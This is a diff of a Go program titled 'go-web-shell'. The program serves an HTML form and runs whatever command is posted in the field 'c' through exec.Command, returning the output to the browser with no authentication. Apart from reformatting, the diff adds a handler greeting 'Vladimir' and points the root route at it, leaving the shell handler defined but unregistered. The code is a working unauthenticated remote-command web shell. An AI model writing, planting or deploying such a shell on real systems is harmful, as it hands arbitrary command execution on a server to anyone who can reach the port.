@@ -3,18 +3,17 @@
 package main
 
 import (
-	"unicode/utf8"
+	"bytes"
+	"errors"
+	"fmt"
+	"log"
 	"net/http"
 	"os/exec"
 	"strings"
-	"errors"
-	"bytes"
-	"fmt"
-	"log"
+	"unicode/utf8"
 )
 
 // kballard: go-shellquote
-
 var (
 	UnterminatedSingleQuoteError = errors.New("Unterminated single-quoted string")
 	UnterminatedDoubleQuoteError = errors.New("Unterminated double-quoted string")
@@ -141,15 +140,15 @@ done:
 
 // go-shellquote ends here.
 
-func run_cmd( s string ) string {
+func run_cmd(s string) string {
 
 	fmt.Println("exec:", s)
 
-	args, _ := Split( s )
+	args, _ := Split(s)
 
 	// cmd := exec.Command( s )
 
-	cmd := exec.Command( args[0], args[1:]... )
+	cmd := exec.Command(args[0], args[1:]...)
 
 	var out bytes.Buffer
 	var errorOutput bytes.Buffer
@@ -162,35 +161,37 @@ func run_cmd( s string ) string {
 	outputString := out.String()
 
 	if err2 != nil {
-		log.Println( err2 )
+		log.Println(err2)
 		return errorOutput.String()
 	}
 
-	outputString = strings.Replace( outputString, "\n", "<br />", -1 )
+	outputString = strings.Replace(outputString, "\n", "<br />", -1)
 
 	return outputString
-	
+
 }
 
 func handler(w http.ResponseWriter, r *http.Request) {
 
-	fmt.Fprintf( w, "<!doctype html><head><meta charset=\"utf-8\" /><title>go-web-shell</title></head><body><form method=\"post\"><input type=\"text\" name=\"c\" id=\"c\" size=\"50\" /><br /><input type=\"submit\" value=\"Ok\" /></form><script>document.getElementById('c').focus();</script></body></html>" )
+	fmt.Fprintf(w, "<!doctype html><head><meta charset=\"utf-8\" /><title>go-web-shell</title></head><body><form method=\"post\"><input type=\"text\" name=\"c\" id=\"c\" size=\"50\" /><br /><input type=\"submit\" value=\"Ok\" /></form><script>document.getElementById('c').focus();</script></body></html>")
 
 	if r.Method == "POST" {
 
-		fmt.Println( r.FormValue("c") )
+		fmt.Println(r.FormValue("c"))
 
 		input_cmd := r.FormValue("c")
 
-		fmt.Fprintf( w, run_cmd( input_cmd )  )
-
+		fmt.Fprintf(w, run_cmd(input_cmd))
 
 	}
 
-	
+}
+
+func handler2(w http.ResponseWriter, r *http.Request) {
+	fmt.Fprintf(w, "Hi, Vladimir")
 }
 
 func main() {
-	http.HandleFunc("/", handler)
+	http.HandleFunc("/", handler2)
 	http.ListenAndServe(":8080", nil)
 }
